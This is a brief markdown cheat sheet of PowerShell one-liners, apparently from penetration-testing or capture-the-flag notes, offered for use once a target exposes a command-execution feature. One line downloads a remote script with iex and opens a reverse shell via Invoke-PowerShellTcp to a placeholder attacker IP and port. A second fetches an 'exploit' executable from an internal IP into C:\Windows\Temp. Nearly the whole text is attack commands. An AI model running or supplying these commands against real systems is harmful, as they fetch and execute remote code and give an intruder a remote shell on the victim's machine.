# Useful Scripts

## Powershell
- Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it:  
`powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port`  

- Download the exploit file from http.server:  
`powershell -c "Invoke-WebRequest -uri 'http://10.2.18.235:8000/shell2.exe' -OutFile 'C:\Windows\Temp\shell.exe'"`  

